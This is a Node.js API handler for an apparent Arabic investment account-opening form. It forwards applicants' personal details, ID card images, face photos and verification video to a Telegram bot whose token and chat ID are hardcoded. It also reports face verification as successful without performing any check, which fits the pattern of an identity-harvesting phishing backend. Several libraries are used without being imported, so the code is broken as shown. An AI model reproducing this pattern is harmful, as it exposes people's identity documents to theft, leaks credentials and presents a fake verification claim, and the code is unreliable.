const db = require('./database');
const { v4: uuidv4 } = require('uuid');

// Configuration
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8660100340:AAEPj1rlH5PfPZ8StoztNi2m7ZmOOgzLrr4';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003890710277';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

function generateRef(type) {
  const prefix = type === 'entity' ? 'ENT' : 'IND';
  const ts = Date.now().toString(36).toUpperCase();
  return `${prefix}-${ts}`;
}

const getIp = req =>
  (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

export const config = {
  api: {
    bodyParser: false, // Disabling bodyParser to handle multipart/form-data with formidable
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }

  const form = formidable({ multiples: true });

  try {
    const [fields, files] = await new Promise((resolve, reject) => {
      form.parse(req, (err, fields, files) => {
        if (err) reject(err);
        resolve([fields, files]);
      });
    });

    const firstName = fields.firstName ? fields.firstName[0] : '';
    const secondName = fields.secondName ? fields.secondName[0] : '';
    const thirdName = fields.thirdName ? fields.thirdName[0] : '';
    const fullName = fields.companyName ? fields.companyName[0] : `${firstName} ${secondName} ${thirdName}`.trim() || 'N/A';
    const phone = fields.phone ? fields.phone[0] : 'N/A';
    const email = fields.email ? fields.email[0] : 'N/A';
    const nationality = fields.nationality ? fields.nationality[0] : 'N/A';
    const idType = fields.idType ? fields.idType[0] : 'N/A';
    const type = fields.companyName ? 'entity' : 'individual';
    
    // Generate Ref and Save to Supabase
    const ref = generateRef(type);
    const { data: request, error: dbError } = await db.from('account_requests').insert({
      ref_no: ref,
      type: type,
      full_name: type === 'individual' ? fullName : null,
      entity_name: type === 'entity' ? fullName : null,
      phone: phone,
      email: email,
      nationality: nationality,
      national_id: fields.nationalId ? fields.nationalId[0] : null,
      id_type: idType,
      ip_address: getIp(req),
      status: 'pending'
    }).select('id').single();

    if (dbError) {
      console.error('Supabase Insert Error:', dbError);
    }

    let message = fields.message ? fields.message[0] : null;

    if (!message) {
      message = `🔔 <b>طلب فتح حساب استثماري جديد (Node.js)</b>
─────────────────────
👤 <b>البيانات الشخصية</b>
• الاسم: ${fullName}
• الهاتف: ${phone}
• البريد: ${email}
• الجنسية: ${nationality}

🪪 <b>وثيقة الهوية</b>
• النوع: ${idType}

🤳 <b>التحقق من الوجه</b>
• الحالة: ✅ تم التحقق بنجاح
─────────────────────
🕐 ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`;
    }

    // 1. Send Text Message with Keyboard
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '📄 إنشاء عقد PDF', callback_data: `gen_pdf_${request ? request.id : 'unknown'}` }
          ]
        ]
      }
    });

    // 2. Send Files
    const fileMap = {
      'idFront': '🪪 الوجه الأمامي للهوية',
      'idBack': '🪪 الوجه الخلفي للهوية',
      'faceImage': '🤳 صورة الوجه',
      'faceVideo': '🎥 فيديو التحقق 360 درجة',
      'crFile': '🏢 السجل التجاري',
      'licFile': '🏢 الترخيص التجاري',
      'idFile': '👤 هوية المالك',
      'authFile': '📝 التفويض'
    };

    const fullNameForCaption = fullName;

    for (const [key, caption] of Object.entries(fileMap)) {
      if (files[key]) {
        const file = Array.isArray(files[key]) ? files[key][0] : files[key];
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', `${caption}\nالاسم: ${fullNameForCaption}`);
        
        let endpoint = 'sendDocument';
        if (file.mimetype.startsWith('image/')) {
          endpoint = 'sendPhoto';
          formData.append('photo', fs.createReadStream(file.filepath), file.originalFilename);
        } else if (file.mimetype.startsWith('video/')) {
          endpoint = 'sendVideo';
          formData.append('video', fs.createReadStream(file.filepath), file.originalFilename);
        } else {
          formData.append('document', fs.createReadStream(file.filepath), file.originalFilename);
        }

        await axios.post(`${TELEGRAM_API}/${endpoint}`, formData, {
          headers: formData.getHeaders(),
          timeout: 60000
        });
      }
    }

    return res.status(200).json({ success: true, message: 'تم استلام الطلب بنجاح', ref_no: ref });

  } catch (error) {
    console.error('Submission Error:', error);
    return res.status(500).json({ success: false, message: error.message });
  }
}
